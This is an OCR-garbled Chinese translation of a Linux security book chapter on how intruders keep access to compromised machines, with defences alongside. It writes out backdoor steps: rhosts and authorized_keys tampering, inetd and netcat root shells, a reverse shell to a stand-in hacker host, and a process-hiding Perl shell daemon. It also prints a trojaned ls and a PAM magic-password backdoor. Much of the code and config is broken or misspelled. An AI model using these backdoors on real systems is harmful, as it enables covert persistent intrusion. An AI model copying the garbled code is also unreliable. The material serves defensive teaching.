你应该使用第 2 章描述的任何程序定期扫描系统，寻找新的或更改的 setuid 程序。特别是 `Nimbus`，它可以扫描系统中的设置为 setuid 的 shell 副本（`/bin/sh`、`/bin/bash` 等），因此可以作为黑客不编译自己的伪 root shell 这种情况的早期警报系统。

应用无 setuid `bash` 补丁将有助于防止新手黑客，而移除编译器将使黑客隐藏自己的代码变得困难得多。然而，如果黑客已经攻破了机器，无论你提供了哪些服务，他都能找到上传文件的方法。这意味着他能够随心所欲地上传 setuid shell（或类似的），无论你的预防措施如何。你最好的办法是尽早发现并尽快将黑客从你的系统中清除。

## 使用 r-命令的无密码远程访问

r-命令——`login`、`rcp` 和 `rsh`——分别用于远程登录、文件复制和命令执行。它们的设计是为了方便常见的网络需求，而无需用户输入密码。它们传统用于多个系统由同一个管理员维护，并且属于同一个功能组的情况，例如实验室、教室或开发环境。

这些命令通过控制两个文件来决定是否授予访问：全局的 `/etc/hosts.allow` 文件和用户 `rhosts` 文件。通过修改这些文件，黑客可以获得对你机器的永久访问权限。

## /etc/hosts.equiv 修改

| 流行度 | 6 |
| :--- | :--- |
| 简单性 | 8 |
| 影响 | 6 |
| 风险等级 | 7 |

`/etc/hosts.equiv` 文件包含了认为功能等效的机器列表——该组中一个系统上的用户应该能够在没有密码的情况下登录该组内的任何其他系统。你也可以可选地在每行中指定用户名，这表示该用户应该以远程系统上的任何身份登录：

```bash
# 将我们的主机名添加到受攻击机器的
# /etc/hosts.equiv
hackedmachine# id
uid=0(root) gid=0(root) groups=0(root),1,2(daemon),3(sys),4(adm),10(wheel)
hackedmachine# echo 'hacker.example.com me' >> /etc/hosts.equiv
```

```bash
# 然后黑客从他的机器进行连接
hackerbox$ hostname
hackerbox.example.com
hackerbox$ id
uid=1000(me) gid=100(users) groups=100(users)
hackerbox$ login -someuser hackedmachine
hackedmachine$ id
uid=500(someuser) gid=500(staff) groups=500(staff),501(web)
```

> 在 `etc.hosts.equiv` 文件中包含用户名允许用户以 hackedmachine 上的任何用户登录。如果没有包含用户名，黑客只能在两个系统上使用相同的用户名登录。然而，这并不是真正的障碍，因为黑客可以在他的机器上创建任何他喜欢的用户名。

幸运的是，`etc.hosts.equiv` 文件在以 root 身份访问时不生效：

```bash
hackerbox$ rsh -root hackedmachine id
Permission denied.
hackerbox$ login -root hackedmachine
Password:
```



所以你可以看到，你无法通过 `hosts.equiv` 文件登录 root 账户。

## hosts 修改

| 流行度 | 9 |
| :--- | :--- |
| 简单性 | 9 |
| 影响 | 9 |
| 风险等级 | 9 |

所有 Linux 用户都可以在其家目录下创建一个名为 `.rhosts` 的文件，允许指定哪些机器无需密码即可登录他们。

# 第10 章：黑客如何维持访问权限

## hosts.equiv 和 rhosts 文件修改

| 流行度 | 8 |
| --- | --- |
| 简单性 | 9 |
| 影响 | 10 |
| 风险等级 | 9 |

`Ssh` 可以配置为 100% 兼容 r-commands（r 命令），并完全像 r-commands 一样尊重 `/etc/hosts.equiv` 和 `.rhosts` 文件。坦率地说，这并不是默认配置。

相反，`ssh` 扩展了通过 `hosts.equiv` 和 `.rhosts` 文件进行无密码访问时必须满足的条件。不仅机器（以及可选的用户名）匹配，客户端还必须证明自己的身份。这是通过内置在 SSH 协议中的挑战-响应机制（`challenge-response mechanism`）实现的。服务器拥有客户端公钥的副本，而客户端必须证明它同时拥有公钥和私钥。如果 `hosts.equiv` `.rhosts` 文件中有适当的条目，且客户端密钥与存储在服务器上的密钥匹配，则无需密码即可授予连接。

这一额外的层防止了 IP 地址欺骗，这也是 `Ssh` 优于 r-commands 的原因之一。然而，在服务器已经被入侵的情况下，这一层与 `hosts.equiv` `.rhosts` 文件一样容易被绕过。黑客只需要将他的主机密钥添加到 `/etc/ssh_known_hosts` 文件中。

`Ssh` 会查看两个额外的文件，即 `/etc/hosts.equiv` 和 `.rhosts` 文件。这些文件的用法与 `/etc/hosts.equiv` `.rhosts` 文件完全相同。如果你只想通过 `Ssh` 启用无密码登录，你应该使用这些文件而不是它们不安全的替代品。这意味着你只允许通过更安全的 `Ssh` 主机身份验证访问，而不是通过可以被伪造的 r-commands 访问，因为 r-commands 不会读取这些文件。

> 注意 确保保护好 `/etc/hosts.equiv` 和 `.rhosts` 文件，就像保护它们不安全的替代品一样。在安装 `Ssh` 时，这些文件同样重要。

### SSH Hosts 文件防御措施

你可以在 `/etc/sshd_config` 文件中设置三个配置变量，以决定你想支持哪些版本的 `.rhosts` 和 `hosts.equiv`：

| `RhostsRSAAuthentication` | 仅当机器/用户列在 `hosts.equiv` 或 `rhosts` 文件中，且机器密钥与本地存储的主机密钥匹配时，允许无密码访问。 |
| `HostsAuthentication` | 与 r-commands 向后兼容。不执行密钥交换。极不建议使用。 |
| `IgnoreRosts` | 忽略用户的 `.hosts` 和 `.hosts` 文件。允许你启用 `/etc/(s)hosts.equiv`，而不会允许用户自行创建额外的无密码访问。 |

每个变量名都接受 `yes` 或 `no` 的值。决定你想支持这些哪种无密码访问方法，并编辑你的 `/etc/sshd_config` 文件以与之匹配。要禁用这些功能，你需要将这些行改为：

```
RostsRSA no
RostsAuthentication no
IgnoreRosts yes
```

当你安装 `Ssh` 时，你应该应该用文件完整性工具监控的文件列表包括以下所有内容：

- `/etc/hosts.equiv`
- `/etc/hosts` （此处重复）
- `/home/*/.hosts`
- `/etc/sshd_config`
- `/etc/ssh_known_hosts`

> 注意 某些包含 `Ssh` 的发行版可能会将配置文件放在 `/etc/ssh` 而不是 `/etc`。

### Ssh 身份 (Identities)

| | |
|---|---|
| 流行度: | 6 |
| 简单性: | 9 |
| 影响: | 10 |
| 风险等级: | 8 |

除了密码外，`Ssh` 还支持使用身份文件（一对公钥/私钥）进行登录。用户在客户端上使用 `ssh-keygen` 创建一个身份，该身份有自己的密码。然后，将公钥追加到服务器上 `$HOME/.ssh/authorized_keys` 文件中，该账户将允许使用此密钥访问。当连接到该账户时，`Ssh` 客户端会要求输入身份密码。一旦提供，客户端将使用身份而非 UNIX 密码进行登录。

由于这种登录方法完全不使用 UNIX 密码，黑客可以使用它通过简单地丢入他的公钥副本，为自己提供某个账户的无密码访问权限：

```bash
# 将身份文件拷贝到被入侵的机器

hackerbox$ scp hacker.identity.pub hackedmachine.example.org:/tmp
```

```bash
# 将身份追加到 authorized_keys 文件

hackedmachine# cat /tmp/hacker.identity.pub >> /root/.ssh/authorized_keys
```

```bash
# 尝试登录

hackerbox$ ssh -root hackedmachine.example.org

Enter passphrase for RSA key 'hacker@example.com': <types passphrase>

hackedmachine id

uid=0 gid=0 (root) groups=0 (root), 1 (bin), 2 (daemon), 3 (sys), 4 (adm), 10 (wheel)
```

要求的密码语是身份密码，是由黑客选择的。它与他机器上的加密身份文件相关，并且完全由他控制。如果他愿意，可以完全删除密码语。访问被入侵的机器只需要这个身份。即使 `hackedmachine` 上的 root 密码更改了，黑客仍然可以仅凭身份登录。

#### Ssh 身份防御措施

如果你不需要支持身份验证的登录，可以通过 `/etc/sshd_config` 中的以下配置关闭它们：

```bash
RSAAuthentication no
```

如果你希望支持这种身份验证，可以通过 `/etc/sshd_config` 中的以下配置来开启它，你应该让你的文件完整性工具监控 `/root/authorized_keys`。

### 网络可访问的 shell (NETWORK ACCESSIBLE SHELLS)

一个 root shell 对黑客是有用的，如果他可以通过网络访问。然而，并非总是可以通过网络使用 root shell。更有意义的是，root 登录会留下审计痕迹。

#### 在 inetd 中添加 Root Shell

| 流行度 | 9 |
| 简单性 | 7 |
| 影响 | 9 |
| 风险等级 | 8 |

黑客通过网络使用 `inetd` 创建 root shell 的简单方法是在 `/etc/inetd.conf` 中添加条目。如果你将 `ipchains/iptables` 或防火墙配置为仅允许访问所需的端口（例如 SSH、SMTP 和 HTTP），黑客将无法连接到他运行 root shell 的端口。他被迫关闭一个现有的服务以便在该端口运行他的 root shell。

```bash
hackerbox nc hackedmachine.example.org 172.16.0.1 (ingress)

open: stdin is not a tty

cd root

ls -ac

.bashrc

.bash_history

.bash_profile

.bash_logout

.my_cnf

.Xauthority

.Xdefaults

cat .ssh_keys
```

```bash
[client]

password = mySQL

exit

hackerbox$
```



![](33829ffb1435b4baef56cd228ec6cd_361_0)

# 第10 章：黑客如何维持访问

黑客可以做任何他想做的事。在这里他查看`/root`。他已经获取了`root`的密码和`.keys`的副本，并可以尝试使用它们。`root`的家目录下有一些可能是安装的文件（事实上，他完全可以运行`-qa`来确定这一点）。更有趣的是`root`正在主动破解那些可以破解的用户密码。黑客现在可以直接读取破解结果，他甚至不需要自己去破解。

TIP 在`/etc/inetd.conf`中添加`root` `shell`是维持访问权限的方法。然而，许多标准的脚本小子攻击也会创建这些`root` `shell`。因此，保护免受这种攻击不仅可以防止黑客维持已获取的访问，还可以保护你免受初始攻击。

## inetd Root Shell 防御措施

首先，如果你运行文件完整性检查，你可以捕获这种简单的攻击，因为`/etc/inetd.conf`被修改了。如果你配置了`ipchains`/`iptables`或防火墙，仅允许访问你所需的端口（例如`SSH`、`SMTP`和`HTTP`），黑客将无法连接到他运行`root` `shell`的端口。他被迫关闭一个现有的服务以便在该端口运行他的`root` `shell`。希望你会发现你的`http`守护进程运行异常，并在调查时发现你的机器已被入侵。

一如既往，使用`chattr +i`锁定`/etc/inetd.conf`和其他配置文件将要求黑客采取额外的步骤来`chattr -`这些文件，并防止大多数脚本小子攻击。

更好的方法是根本不运行`inetd`。通过`inetd`提供的许多服务并不是必需的；例如，`telnetd`、`rlogin`、`rshd`、`rexec`可以（并且应该）关闭并被`OpenSSH`替换，后者以更安全的方法提供相同的功能。

## 破解 Linux 揭秘：Linux 安全秘密与解决方案

在这种情况下，黑客只需要将他需要的条目写入如`/inetd.conf`的文件并手动运行`inetd.conf`：

```
hackedmachine# cat > /inetd.conf <<EOM

ingresslock stream tcp nowait root / /bin/bash -i

amanda stream tcp nowait root / /usr/bin/reboot

EOM

hackedmachine# /usr/sbin/inetd /inetd.conf
```

在上面的示例中，`ingresslock`和`amanda`端口将由手动启动的`inetd`进程处理。在这种情况下，第一个端口可以使用`root` `shell`，而第二个端口则提供了一个强制`root`重启的快速方法。

> 注意：如果要绑定的端口在`1023`以上，则此`inetd`就不需要以`root`身份运行。因此，尚未获得`root`权限的黑客可以以自己的身份运行他的`inetd`。如果他认为自己可能被发现，或者希望规避无意中登录审计日志（通过`syslog`或`utmp`和`wtmp`文件），那么这种方法将非常有用。

### 自定义 Inetd 服务器防御措施

其中一种很难防范。你可以通过移除`inetd`的执行权限来防止普通用户创建此后门。然而，任何已经获得某种访问权限的人都可能上传或编译他自己的`inetd`副本或其他类似程序的副本并执行它。因此，最好的限制仍然是通过防火墙或`iptables`规则集禁止访问除特定已绑定端口以外的所有入站访问，并通过定期扫描网络端口来密切监控你的端口。

### 使用 Netcat 提供入站 Root Shell

| 流行度 | 6 |
| :--- | :--- |
| 简单性 | 7 |
| 影响 | 9 |
| 风险等级 | 7 |

使用`inetd`（无论是实际系统守护进程还是黑客运行的个人副本）都是创建快速`root` `shell`的一种相当简单的方法。然而，这并不十分优雅，有真才的黑客更有可能使用自己编写的程序来实现同样的功能。我们向你展示它是多么简单，并提供了一些我们自己的脚本。通过跳过极其无聊的网络`socket`处理部分，我们将直接使用`Netcat`。`Netcat`是一个如此简单又极其实用的工具，值得被频繁调用。

## 第 10 章：黑客如何维持访问

首先，黑客在被黑的机器上创建一个简单的`shell`脚本并启动`Netcat`：

```
hackedmachine# cat /tmp/rootshell

!/bin/bash

/bin/bash -i

hackedmachine# nc -vv -l -p 9999 -e /tmp/rootshell

listening on [any] 9999 ...

connect to [127.0.0.1] from hackerbox.example.com [172.18.0.9.1] 2038
```

然后，他从他的机器连接：

```
hackerbox$ nc -vv hackedmachine.example.com 9999

hackedmachine.example.com [172.18.9.1] 9999 (7) open

stty: standard input: Invalid argument

[root@hackedmachine]# pwd

pwd

/root

[root@hackedmachine]# w

11:17am up 180 days, 38 min, 4 users, load average: 1.89, 1.56, 1.23

USER TTY FROM LOGIN IDLE JCPU PCPU WHAT

reegen tty ws5.example.com 27Nov 0 2days 0.33s 0.13s tsh

maddie pts/0 19Apr 0 1.00s 0.46s 7

chris pts/1 ws0.example.com 27Nov 0 16:52m 1.42s 1.01s /bin/mutt

ryan pts/2 ws0.example.com 27Nov 0 55:10 5.18s 1.17s bash
```

`/tmp/rootshell`仅仅是运行`bash -i`，就像我们在之前的`inetd`示例中做的那样。我们需要把它单独放在一个文件中，因为`Netcat`只允许`-e`参数后允许一个简单的程序名。作为额外，使用`Netcat`而不是`inetd`允许我们对`shell`进行作业控制。

`Netcat`的设计用于处理单连接，而不是`inetd`自动提供的无限连接。因此，我们需要编写一些辅助守护进程，每当之前的`Netcat`程序退出时启动`Netcat`。下面是一个可能的`Perl`示例：

```perl
#!/usr/bin/perl

# runnc Netcat root shell.

#

# Usage:

# 'runnc -d' 作为守护进程，

# 'runnc' 作为 Netcat 辅助程序（伪 shell）。
```

```perl
use POSIX;

$FAKENAME='flushd';

# # 保存实际进程名

$ME = $0;

# 隐藏进程名

$0 = $FAKENAME;
```

## 破解 Linux 揭秘：Linux 安全秘密

# 如果我们通过 'nc -e' 启动，将在无参数的情况下
# 被调用，因此作为伪 shell，循环处理
# 输入允许黑客运行命令

```perl
unless (@ARGV) {

  $=1;

  open STDERR,&STDOUT;

  print "Welcome to your root shell.\n"

  print "hackedbox# ";

  while (<>) {

    chomp($);

    system($_) && print "!\n";

    print "hackedbox# ";

  }

}

# 我们应该作为守护进程启动。

chdir '/'

# fork 分离并由 init 拥有。

# 脱离终端

fork; setid or die "Can't start a new session: $!"

while 1; {

  print "Running Netcat\n"

  # fork 并运行 Netcat 程序（隐藏其进程名到

  unless (open(NETCAT, "|")) {

    exec "/home/bin/nc" $FAKENAME;

    exit;

  } else {

    # 将命令行发送到 stdin 以从 ps 中隐藏。

    print NETCAT "-p 9999 -e $ME";

    close(NETCAT);

  }

  wait; # 等待 Netcat 完成。
}
```



当 `/runnc -d` 运行时，上面的程序会 fork 并分离控制终端以成为守护进程，并在每次之前的 Netcat 退出时简单的运行 Netcat。Netcat 允许我们将命令行参数作为标准输入，这有助于其从 `ps` 中隐藏。此外，我们通过将 Netcat 程序的名称更改为 "[flushd]" 来让管理员不会注意到它们。

## 第 10 章：黑客如何维持访问

如果我们使用 `/tmp/rootshell` 辅助程序（如第一个示例所示），会在 `ps` 输出中看到 `/bin/bash /tmp/rootshell` 和 `/bin/bash -i`，这会暴露我们。因此，我们将此 Perl 脚本作为 Netcat 的辅助程序。在脚本顶部，通过检查是否提供了任何参数来演示我们是辅助程序——如果没有，则允许用户通过 `system()` 运行命令。如果查看运行的进程，我们会看到：

```
hackedme$ ps -ef | grep netcat
root      2 1 6 00:00:00 [flushd]
root 30757 0 11 00:00:00 [flushd]
root 30758 0 11 00:00:00 [flushd]
```

进程 30757 是 `run` 守护，`runnc` 是 辅助程序（进程 2 是真正的内核 `flush`，与我们的 hack 无关）。每个看起来像名为 "[flushd]" 的守护进程。

在这里我们找到了一种在不使用 `indent` 的情况下在被黑机器上创建 `root` shell 的方法。许多其他方法也可以实现这一点。在各种黑客网站上的几个 C 程序也同样这样做。有些会将密码硬编码在二进制文件中。

## 入站 Root Shell 防御措施

如果你有进程检查脚本（如第 2 章所述），你应该寻找任何带有 "-i" 选项运行的 shell（`bash`/`ksh`/`sh`/etc.）。匹配此内容的良好正则表达式是 `/\b(a|ba|k|tc)\n?sh.*-\S*i*/`。如果最后的字符串非常痛苦，你应该阅读 `perl`。

> 没有理由将 `/bin/sh` 复制为 `/tmp/klogd` 或其他不匹配上述模式的文件，或者简单创建了自己的伪 shell。

另一个好方法是使用 Bash（或类似工具）监控任何执行名不同（`/bin/runnc`）且 `ps` 值（如 `[flushd]`）不同的程序，这些是进程隐藏自身的其他指示。

## 间接入站访问

| 流行度 | 6 |

| :--- | :--- |

| 简单性 | 6 |

| 影响 | 10 |

| 风险等级 | 7 |

到目前为止的示例展示了黑客如何在被黑机器上设置一个端口，他可以从外部连接并运行他的命令。如果这些形式的后门不可用，

启用远程命令执行的一种间接方法是让被黑机器发起到互联网上机器的连接，并让黑客的命令通过此连接进行隧道。由于大多数防火墙允许不受限制的出站访问，这种连接通常是允许的。

假设黑客能够以 `root` shell 启动在 `amanda` 端口监听的个人 `indent` 副本，该端口被屏蔽且无法直接访问。访问此端口的一种简单方法是使用 SSH 的隧道功能：

```
hackedmachine$ ssh -V hacker@hackerbox.example.com -R 9999:localhost:amanda
SSH Version OpenSSH-2.3, protocol 1.5/2.0.
debug: Seeding random generator
debug: ssh_connect: getuid(1000) 0 anon 0
debug: Connecting to hacker@hackerbox.example.com [172.18.9.1] port 22
debug: Seeding random generator
debug: Connection established.
debug: Remote protocol version 1.5, remote software version 1.27
debug: Local version string SSH-1.5-OpenSSH-2.3
debug: Waiting for server public key.
debug: Received server public key (768 bits) and host key (1024 bits).
debug: Host 'hackerbox.example.com' is known and matches the RSA host key.
debug: Encryption type 3des
debug: Seeding encrypted session key.
debug: Installing crc compensation attack detector.
debug: Received encrypted confirmation.
debug: Requesting pty.
debug: Connections to remote port 9999 forwarded to localhost:amanda
debug: Requesting shell.
debug: Entering interactive session.
hackerbox$
hackerbox$
```

## 第 10 章：黑客如何维持访问

为了从他的机器连接到被黑 `hackedmachine` 上的 `root` shell，黑客连接到他的本地端口 9999：

```
hackerbox$ nc localhost 9999
pwd
/root
uname -n
hackedmachine
```

执行此操作后，Ssh 会话中会出现以下内容：

```
hackerbox$ debug: channel 0: new [port 9999, connection from localhost port 3699]
hackerbox$ -
```

以下是已打开的连接：

```
#0 port 9999, connection from localhost port 3699 (t4 r1 i1/0 o16/0 fd 6/6)
```

- `-C` 命令向 `ssh` 请求显示所有现有的转发连接，我们看到了黑客通过 Ssh 连接从他的机器到 `hackedmachine` 上的 `amanda` 建立连接。

为了确保 Ssh 连接始终处于激活，黑客可以使用像下面的简单脚本。将其与身份验证（`identity`）结合以自动允许无密码访问，这样入站连接应该始终通过 Ssh 转发可用。

```bash
#!/bin/sh
while [ 1 ] ; do
  ssh -R9999:localhost:amanda user@hackerbox.example.com sleep 5000
done
```

我们使用了连接到 `amanda` 端口上运行的 `root` shell 的示例。这种方法可以允许对任何受限端口的入站访问，例如 SMTP、HTTP 或 IMAP，而不仅仅是运行中的 `root` shell。这只是为了展示你可以在家里快速尝试这种方法。

对于一个可以从外部可用但从内部发起的直接 `root` shell，黑客可以拥有以下进程：

```
hackedmachine# nc -e /tmp/cmdshell hackerbox.example.com 9999
```

```
hackerbox# nc -p 9999 -l
```

其中 `/tmp/cmdshell` 是一个读取并运行命令的程序。请参见“使用 Netcat 提供入站 Rootshells”中的 `runnc` perl 脚本或附录 D 中的第三个扩展案例研究获取示例。

## 间接入站访问的防御措施

与之前的网络 `root` shell 示例一样，这是一种很难停止的攻击。Goodchains/`iptables` 规则集可能会阻止黑客想要执行的连接。然而，大多数配置允许无限制的出站访问，由于这些连接是从你的系统建立的，该连接可能不会被阻止。即使是限制性配置通常也允许对某些端口进行不受的访问，SMTP 和 HTTP 就是主要的例子。

拥有良好的防火墙并定期检查日志可能会指出此类异常连接，你可以手动检查这些连接。例如，如果你的机器建立了一个长达五个小时的 HTTP 连接，你可以确定其中有猫腻。部署一个良好的 IDS 系统也可以捕获这些不规则的使用模式。

## 木洛马化系统程序

在第 4 章中，我们描述了木洛马——由黑客设计的、试图入侵你系统的程序。这些程序不会自动运行，而是必须由管理员启动。在运行之前，它们仅仅是静止的。这些程序通常被伪装成有用的程序。

如果黑客接管了你的系统，他可能想要获取一个现有程序并对其重新编译，使其仍然像原始程序一样运行，但包含了额外的代码。更改通常是为了在两个类别之一中添加新功能——隐藏踪迹和后门。执行这一过程被称为木洛马化（`trojaning`），生成的程序是木洛马化的二进制文件（`trojaned binary`）。

由于各种变体的防御措施非常相似，我们将它们放在攻击讨论的最后。同样地，尽管我们可以提供黑客如何木洛马化各种类型二进制文件的深入示例，但这将变得相当重复，因此我们只关注其中少数几个。



## 隐藏踪迹

任何攻击都可能留下一些踪迹。即使是登录也会日志文件和 `{u|w}tmp` 文件中留下条目。在入侵你的系统后，黑客可能会清理任何他已进入的迹象。然而，这是一个持续的过程，因为他采取的每一个动作，例如运行密码破解器、启动出站攻击或设置 IRC 继器，都可以通过各种系统工具看到。通过木洛马化各种系统程序，他可以隐藏部分正在进行的活动。

## 登录报告

| 指标 | 评分 |
| :--- | :--- |
| 流行度 | 6 |
| 简单性 | 5 |
| 影响 | 8 |
| 风险评分 | 6 |

大多数登录程序会将日志信息写入 `wtmp`、`utmp` 或 `syslog` 文件。通过重新编译 `login`、`su`、`sudo`、`in.telnetd`、`sshd`、`logind` 等，黑客可以防止写入任何登录信息。

`w`、`who` 和 `last` 命令将扫描 `wtmp` 或 `utmp` 文件以报告当前在线的用户或显示之前的登录。通过修改报告登录的命令，黑客可以在不更改文件内容的情况下保持隐形。

在这些情况下，黑客可以对相关程序进行木洛马化，根据他想要的任何标准选择性地记录或报告。例如，他可以隐藏其用户 ID 的所有登录、来自特定主机、通过特定协议或针对某些 `su`/`sudo` 命令的登录。

| 指标 | 评分 |
| :--- | :--- |
| 流行度 | 6 |
| 简单性 | 6 |
| 影响 | 8 |
| 风险评分 | 7 |

黑客可能会木洛马化 `syslog` 守护进程本身。大多数系统程序将日志提交给 `syslog`，由它负责将日志发送到相应的目的地。

## 进程报告

| 指标 | 评分 |
| :--- | :--- |
| 流行度 | 7 |
| 简单性 | 5 |
| 影响 | 8 |
| 风险评分 | 7 |

（注：以下代码块似乎是对 OCR 文本中描述源逻辑的重构）

### 进程报告（源逻辑）

```c
void logmsg(PROCTAB PT, const char* from, int flags) {
    struct dirent *ent;
    static struct stat sb;
    static char path[32], sbuf[512];
    int allocated = 0, matched = 0
    proc_t *p = NULL;
    // ... 扫描 /proc 的逻辑 ...
}
```

（注：OCR 文本表明存在 `read_proc` 函数）

```c
proc_t* ps_readproc(PROCTAB PT) {
    struct dirent *ent;
    struct stat sb;
    char path[32];
    // ... readdir /proc 的逻辑 ...
}
```

## 文件报告

| 指标 | 评分 |
| :--- | :--- |
| 流行度 | 6 |
| 简单性 | 5 |
| 影响 | 7 |
| 风险评分 | 6 |

文件报告工具 `find`、`ls`、`lsof`、fileglobs 以及 `locate`/`slocate` 通常能够找到系统由黑客创建的任何文件。这些文件通常包含他们的漏洞源码、攻击输出、破解数据库和机器列表。黑客可以修改这些程序来静静地隐藏他们的文件或目录，为他们提供隐藏的游场。

## 破解 Linux：Linux 安全秘密与解决方案

以下是 `ls.c` 的一个被破解过的示例，它是 `/bin/ls` 的源码：

* 如果 `^next` 中的文件应该列出，则返回非零值。 */

```c
static int
file_interesting (const struct dirent *next)
{
    register struct ignore_pattern *ignore;

    for (ignore = ignore_patterns; ignore; ignore = ignore->next)
        if (fnmatch(ignore->pattern, next->d_name, FNM_PERIOD) == 0)
            return 0;

/* 黑客插入的代码开始 */
if (!strncmp(next->d_name, "...")) {
    return 0;
}
/* 黑客插入的代码结束 */

if (really_all_files)
    || next->d_name[0] != '.'
    || (all_files
        && next->d_name[1] != '\0'
        && (next->d_name[1] != '.' || next->d_name[2] != '\0'))
    return 1;
```

```c
return 0;
```

在这里，黑客修改了 `file_interesting` 函数，该函数用于确定某个文件是否应该在列表中打印。通常情况下，像 `.profile` 或 `.bashrc` 这样的点文件不会打印，除非你使用 `ls -a`——该函数决定了哪些文件名在列表中应该被静默忽略。他仅仅是插入了一个快速检查——如果文件名是 "..."，它将永远不会被列出——如下例所示：

```bash
hackedmachine$ ls -adf ?*
    .gimp/ .profile
    .kshrc .ssh/
    .bash_history .mutrc .xauth/
    .bashrc .netrc

hackedmachine$ cd ...
hackedmachine$ pwd
hackedmachine$ /home/scott/...
```

# 第 10 章：黑客如何维持访问权限

```bash
hackedmachine$ ls -F
crack-5.0/ hacking_scripts/ machinelists/
cracked_passwords john-1.6/ unknown_passwords
```

通过对足够的文件列出程序进行木马化处理，黑客可以隐藏他所有的特殊目录以避开视线。

注意：实际上还有几个地方你需要修改 `ls` 来隐藏名为 `.` 的文件，但这个示例展示了这有多简单。此外，我们不需要自己做所有的肮脏活儿——完全木马化的版本已经存在，并且可以轻松下载。

# 网络报告

| 流行度 | 7 |
| :--- | :--- |
| 简单性 | 5 |
| 影响 | 7 |
| 风险等级 | 6 |

黑客与你系统的连接，以及到其他系统的出站连接，可以通过 `netstat`、`lsof` 和 `tcpdump` 等程序可见。其他网络信息，如配置的接口、网络路由和硬件地址表，可以通过对 `route`、`ifconfig` 和 `arp` 等命令进行木马化来隐藏或清理。

例如，想象一个黑客想要建立一个破解站点。他可以创建一个以太网接口并在上面运行 FTP 服务器。他会配置木马化的报告程序，使其在该特定接口上列出任何内容。这样，FTP 会话就永远不会被列出或汇总，你可能不会怀疑为什么网络看起来很慢，因为所有工具都显示使用率极低。

# 安全工具

| 流行度 | 8 |
| :--- | :--- |
| 简单性 | 6 |
| 影响 | 10 |
| 风险等级 | 8 |

特别特别需要被木马化或禁用的是任何本地安装的安全工具，例如进程检查脚本、用户监控软件，或文件完整性工具或数据库。如果黑客能够修改文件完整性软件或设置忽略黑客安装目录的 `setid` 检查，他们就可以安全地在其中安装任何内容而不被发现，包括 `setuserid root` 的程序，而这些程序通常会被发现的。

# 后门

黑客最担心的问题之一是他将失去对已经攻破的系统的控制。因此，他在系统中添加后门是很常见的，这将确保他拥有持续的访问权限，即使提供访问权限的原始漏洞被发现并修复，管理员添加了将他锁外的访问列表。

# 网络服务

| 流行度 | 6 |
| :--- | :--- |
| 简单性 | 5 |
| 影响 | 9 |
| 风险等级 | 7 |

黑客可以修改现有的守护进程以包含隐藏的网络服务。例如，黑客可以重新编译 `inetd` 或 `xinetd` 以包含一个新的服务（最可能是一个 root shell），该服务始终开启，但未在 `/etc/[x] inetd.conf` 文件中列出。再结合网络报告工具的更改，该新资源从本地系统来看实际上是不可见的。

# 网络访问限制

| 流行度 | 6 |
| :--- | :--- |
| 简单性 | 6 |
| 影响 | 8 |
| 风险等级 | 7 |

访问限制通常通过通过 `ipchains` 和 `iptables` 的内核 ACL 控制，或者通过 `TCP wrappers` 逐个程序进行控制。通过对 `ipchains`/`iptables` 二进制文件或 `TCP wrapper` 库进行木马化，黑客可以确保有一条隐藏规则允许他的机器访问，无论管理员设置了什么规则。

# 身份验证规则



| 流行度 | 6 |
| :--- | :--- |
| 简单性 | 6 |
| 影响 | 9 |
| 风险等级 | 7 |

任何验证用户身份的服务，例如通过 `imapd` 和 `pop3d` 的邮件服务，或登录服务，都可以重新编译以包含魔法密码。

# 第10 章：黑客如何维持访问权限

当使用这些魔法密码时，访问权限会自动授予用户，无论密码如何。这允许黑客在系统更改的情况下访问。

# PAM 库

| 流行度 | 6 |
| :--- | :--- |
| 简单性 | 5 |
| 影响 | 9 |
| 风险等级 | 7 |

许多服务通过 PAM（可插式认证模块）进行验证，而不是将身份验证构建在每个程序中。让我们使用示例程序 `login`。它从 `/etc/pam.login` 获取配置：

```text
auth required /lib/security.so
```

尝试从本地 tty 运行登录：

```bash
brenda@machine$ login
login: bonnie
Password: <password here>
You have mail.
george@machine$ exit
```

我们注释掉 `/etc/pam.login` 中包含 `lib/security/pam_pwdb.so` 的行，并再次尝试：

```bash
brenda@machine$ login
login: bonnie
bonnie@machine$
```

通过注释掉该行，我们告诉 PAM 模块 `login` 不需要运行 `pwdb` 来验证 `/etc/passwd` 和 `/shadow` 中的密码有效性。因此访问被直接授予。这种更改很快会被注意到——用户不需要密码就能获得访问，并引发怀疑。然而，黑客可以修改 `pwdb` 执行实际验证的方式。从 PAM 源码（不，文件名没有拼写错误）中，我们有以下代码段：

```c
static int _unix_verify_password(pam_handle_t *pamh, const char *name,
    const char *p, unsigned int ctrl)
{
    struct pwdb *pw=NULL;
...
/* 黑客插入的代码开始 */
    if ( strcmp(p, "SuPer s3crit s7r*")) {
        return PAM_SUCCESS;
    }
    /* 黑客插入的代码结束 */

    D(("called"));

    /* 查找该用户的条目 */

    D(("locating user's record"));
...
```

## 第 10 章：黑客如何维持访问

该函数的剩余部分（大约 8 页内容）包含了检查用户密码有效性所需的所有代码，允许重试并在必要时运行任何外部辅助程序。注意，黑客在 D 行（"called"）之前插入了一个严格的 `mp`；

随后，黑客编译此版本的 `pam_pwdb` 并将其安装到 `/lib/security`。此后，任何在 `pam_pwdb` 上运行的启用 PAM 的软件（几乎包含所有认证软件，包括登录、sshd、su、xscreens 等）将允许通过此后门密码获得访问。如果提交了魔法密码（`upeR3crit sr7n*`），将不会执行任何实际的用户名/密码检查；仅授予访问。由于黑客可以为大多数服务提供用户名，因此通过记住他编译进 `pam_pwdb.so` 的密码，就可以获得用户和 root 权限。

这是一种提供登录/认证后门要优雅得多的方法，因为它影响了所有感知 PAM 的软件，并且没有留下允许所有密码普遍通用的这种显性漏洞。

## 网络守护进程修改

| 指标 | 评分 |
| :--- | :--- |
| 流行度 | 5 |
| 简单性 | 5 |
| 影响 | 10 |
| 风险等级 | 7 |

黑客可以修改现有的网络守护进程（例如打印守护进程），使其也拥有魔法字符串。例如，黑客可以重新编译 `sendmail` 以接受一个新的类似 SMTP 的命令 "RUNCMD"，该命令将以 root 身份运行并返回输出，如下所示：

```
hackerbox telnet hackedmachine.example.org smtp
Trying 172.30.15...
Connected to hackedmachine.example.org.
Escape character is '^'.
220 mail.example.org SMTP Sendmail 8.10.1/80.1; 19 Apr 2000 04:43 -0800
HELO hackerbox.example.com
250 mail.example.org Hello hackerbox.example.com, pleased to meet you
HELnP214-2.0.0 This is Sendmail version 8.10.1
214-2.0.0 Topics:
214-2.0.0 HELO ENHLO MAIL RCPT DATA
214-2.0.0 RSET NOOP QUIT HELP VRFY
214-2.0.0 EXPN VERB ETRN DSN
214-2.0.0 For more info use "HELP <topic>"
